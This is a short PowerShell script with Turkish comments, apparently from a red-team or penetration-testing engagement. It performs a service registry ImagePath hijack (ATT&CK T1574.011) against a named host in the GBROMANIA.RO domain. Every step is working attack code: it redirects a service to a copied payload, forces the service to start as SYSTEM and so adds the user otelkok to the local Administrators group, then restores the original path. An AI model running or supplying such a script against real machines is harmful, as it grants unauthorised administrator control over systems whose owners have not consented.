# T1574.011 — Service Registry ImagePath Hijack
# MITRE ATT&CK: T1574.011, T1543.003
# Target: RHOF10-LAP-931 (GBROMANIA.RO)
# Payload: PrivEscPayload.exe — adds otelkok to local Administrators
# ---------------------------------------------------------------

# 1. Hedef servisi sec (ornek: disabled SYSTEM servis)
$svc = "JPwdChange"   # veya baska bir non-critical servis

# 2. Orijinal ImagePath'i yedekle
$orig = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$svc").ImagePath
Write-Host "Orijinal: $orig"
$orig | Out-File "$env:TEMP\svc_backup_$svc.txt"

# 3. Payload'u kopyala
Copy-Item "C:\Users\otelkok\Documents\la\tools\PrivEscPayload.exe" "C:\Windows\Temp\svcupd.exe"

# 4. ImagePath'i degistir
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$svc" -Name ImagePath -Value "C:\Windows\Temp\svcupd.exe"
# Start type'i Manual yap (Disabled ise baslatamayiz)
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$svc" -Name Start -Value 3 -Type DWord

# 5. Servisi baslat (SYSTEM olarak calisir)
Start-Service $svc

# 6. Sonucu kontrol et
Start-Sleep 3
Get-Content "$env:TEMP\privesc_result.txt"
net localgroup Administrators

# 7. GERI AL — orijinali restore et
Set-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\$svc" -Name ImagePath -Value $orig
